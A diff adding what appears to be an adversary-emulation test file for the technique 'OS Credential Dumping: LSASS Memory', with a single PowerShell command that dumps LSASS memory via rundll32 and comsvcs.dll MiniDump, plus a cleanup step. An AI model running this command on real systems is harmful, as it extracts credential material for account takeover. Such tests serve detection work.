@@ -1,0 +1,11 @@
+#TechniqueName: OS Credential Dumping: LSASS Memory
+#AtomicTestName: Dump LSASS.exe Memory using comsvcs.dll
+#Language: ps1
+
+#commands
+C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
+
+
+#cleanup_commands
+Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
+
